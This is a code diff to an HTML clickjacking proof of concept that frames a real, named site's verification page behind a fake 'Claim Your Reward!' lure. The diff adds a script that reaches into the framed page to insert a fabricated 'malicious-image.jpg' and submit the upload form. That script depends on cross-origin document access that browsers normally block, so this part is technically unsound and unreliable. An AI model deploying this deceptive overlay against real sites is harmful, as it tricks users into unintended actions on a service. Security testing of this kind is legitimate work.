@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clickjacking PoC</title>
+    <title>Clickjacking PoC - Unauthorized Image Upload</title>
     <style>
         /* Container for the iframe */
         .iframe-container {
@@ -29,9 +29,9 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 200px;
-            height: 50px;
-            background-color: rgba(255, 0, 0, 0.5); /* Semi-transparent red */
+            width: 300px;
+            height: 100px;
+            background-color: rgba(0, 255, 0, 0.5); /* Semi-transparent green */
             z-index: 1;
             cursor: pointer;
         }
@@ -40,20 +40,54 @@
         .overlay-text {
             color: white;
             text-align: center;
-            line-height: 50px;
-            font-size: 18px;
+            line-height: 100px;
+            font-size: 24px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="iframe-container">
-        <!-- Embed the target website in an iframe -->
-        <iframe src="https://contentcredentials.org/"></iframe>
+    <h1>Welcome to a Fake Site!</h1>
+    <p>Click the button below to claim your reward:</p>
 
-        <!-- Overlay to trick the user -->
+    <div class="iframe-container">
+        <!-- Embed the vulnerable site's image upload form in an iframe -->
+        <iframe src="https://contentcredentials.org/verify"></iframe>
+
+        <!-- Overlay to trick the user into clicking the upload button -->
         <div class="overlay">
-            <div class="overlay-text">Click Me!</div>
+            <div class="overlay-text">Claim Your Reward!</div>
         </div>
     </div>
+
+    <script>
+        // JavaScript to automate the file selection and upload process
+        window.onload = function() {
+            const iframe = document.querySelector('iframe');
+
+            // Wait for the iframe to load
+            iframe.onload = function() {
+                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+
+                // Simulate file selection
+                const fileInput = iframeDocument.querySelector('input[type="file"]');
+                if (fileInput) {
+                    // Create a fake file to upload
+                    const file = new File(['Malicious content'], 'malicious-image.jpg', { type: 'image/jpeg' });
+
+                    // Assign the file to the input
+                    const dataTransfer = new DataTransfer();
+                    dataTransfer.items.add(file);
+                    fileInput.files = dataTransfer.files;
+
+                    // Trigger the upload (if the form auto-submits on file selection)
+                    const uploadForm = iframeDocument.querySelector('form');
+                    if (uploadForm) {
+                        uploadForm.submit();
+                    }
+                }
+            };
+        };
+    </script>
 </body>
 </html>
